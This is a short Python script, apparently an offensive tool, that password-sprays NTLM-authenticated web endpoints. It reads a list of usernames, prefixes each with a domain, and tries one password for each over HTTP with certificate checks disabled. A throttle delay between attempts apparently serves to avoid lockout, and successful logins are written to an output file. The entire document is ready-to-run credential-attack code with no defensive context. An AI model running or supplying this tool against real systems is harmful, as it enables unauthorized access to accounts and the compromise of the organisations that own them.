#!/usr/bin/python3
import os
import sys
import argparse
import time
import subprocess
import requests
from requests_ntlm import HttpNtlmAuth

parser = argparse.ArgumentParser()
parser.add_argument("-f","--filename",help='filename containing a list of usernames to try.')
parser.add_argument("-a","--account",help='account to attempt (for single login test)')
parser.add_argument("-u","--url",help='url to perform the NTLM bruteforce')
parser.add_argument("-o","--output",help='filename of output file')
parser.add_argument("-d","--domain",help='domain to test credentials against')
parser.add_argument("-p","--password",help='Password to use for the attack')
parser.add_argument("-t","--throttle",help='Delay is seconds between requests')
parsed = parser.parse_args()

def brute(accnt, pwd, url):
	auth = HttpNtlmAuth(accnt, pwd)
	response = requests.get(url, auth=auth, verify=False)
	if response.status_code == 200:
		print ("[+] Password is valid for account {}".format(accnt))
		return True
	else:
		print ("[-] Error Code: {}".format(response.status_code))
		return False
	

if (parsed.account):
    brute(parsed.account, parsed.password, parsed.url)
elif(parsed.filename):
    with open(parsed.filename,'r') as fh:
        for line in fh.readlines():
            line = line.strip()
            domain = parsed.domain
            username = domain + "\\" + line
            print ("The username is {}".format(username))
            print ("Sleeping for {} seconds".format(parsed.throttle))
            sleep = int(parsed.throttle)
            time.sleep(sleep)
            if brute(username, parsed.password, parsed.url):
            	outfile = open('./{}'.format(parsed.output),'a')
            	outfile.write("Found Valid Login for account: {}\n".format(line))
else:
	print ("Provide arguments")